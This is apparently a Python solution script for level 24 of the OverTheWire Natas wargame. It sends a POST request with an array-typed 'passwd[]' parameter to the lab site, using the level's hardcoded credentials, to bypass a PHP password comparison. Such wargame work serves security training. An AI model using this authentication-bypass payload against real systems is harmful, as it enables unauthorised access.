#!/usr/bin/python3
# Time: 2019/04/23 4:56 PM


import requests
import base64
import codecs


# 禁止跳转

username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
url = f'http://{username}.natas.labs.overthewire.org/'

# url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()


resp = s.post(url, auth=(username, password), data={"passwd[]": "ook"})
print(resp.text)
print("**"*40)




